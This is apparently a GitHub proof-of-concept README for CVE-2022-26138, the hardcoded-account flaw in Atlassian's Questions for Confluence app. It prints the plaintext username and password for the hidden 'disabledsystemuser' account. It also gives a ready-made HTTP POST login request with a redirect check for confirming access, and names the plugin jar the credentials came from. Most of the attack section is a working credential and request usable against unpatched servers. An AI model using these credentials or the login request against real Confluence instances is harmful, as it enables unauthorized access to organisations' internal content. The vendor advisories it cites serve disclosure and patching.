# CVE-2022-26138 POC
![questions_cve](https://user-images.githubusercontent.com/105424007/180184601-06a62fae-a5ba-412f-9304-d9c3abb0c400.png)

## Description
```
The Atlassian Questions For Confluence app for Confluence Server and Data Center 
creates a Confluence user account in the confluence-users group with 
the username disabledsystemuser and a hardcoded password. A remote, 
unauthenticated attacker with knowledge of the hardcoded password could
exploit this to log into Confluence and access all content accessible 
to users in the confluence-users group. 
This user account is created when installing versions 2.7.34, 2.7.35, and 3.0.2 of the app.
```

## POC
Hardcoded Credentials: 
 - User: `disabledsystemuser`
 - Password: `disabled1system1user6708`

## Exploitation
```
POST /dologin.action HTTP/1.1
Host: victim.local
Content-Type: application/x-www-form-urlencoded

os_username=disabledsystemuser&os_password=disabled1system1user6708&login=Log+in&os_destination=%2Fvulnerable.action
```
If the server redirects to `/vulnerable.action`, credentials are valid.

## Were did you get the creds from?

The hardcoded credential were plainly laying inside the jar files of the affected plugin

`https://packages.atlassian.com/maven-atlassian-external/com/atlassian/confluence/plugins/confluence-questions/3.0.2/confluence-questions-3.0.2.jar`

## References
* https://www.cvedetails.com/cve/CVE-2022-26138/
* https://confluence.atlassian.com/doc/confluence-security-advisory-2022-07-20-1142446709.html
* https://jira.atlassian.com/browse/CONFSERVER-79483
